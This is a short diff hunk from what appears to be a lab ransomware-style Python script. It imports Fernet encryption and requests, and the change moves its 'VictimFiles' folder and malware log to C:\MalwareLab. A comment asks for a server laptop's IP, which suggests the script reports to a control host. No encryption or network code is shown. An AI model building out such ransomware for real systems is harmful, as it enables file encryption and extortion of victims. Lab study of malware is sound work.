@@ -3,8 +3,9 @@ import requests
 from cryptography.fernet import Fernet
 from datetime import datetime
 
-VICTIM_FOLDER = "./VictimFiles"
-LOG_FILE = "./malware_log.txt"
+# Victim files path on Drive C
+VICTIM_FOLDER = "C:\\MalwareLab\\VictimFiles"
+LOG_FILE = "C:\\MalwareLab\\malware_log.txt"
 
 # ===== IMPORTANT: Configure this with your SERVER LAPTOP IP =====
 # On SERVER laptop, run: ipconfig (Windows) and find IPv4 Address
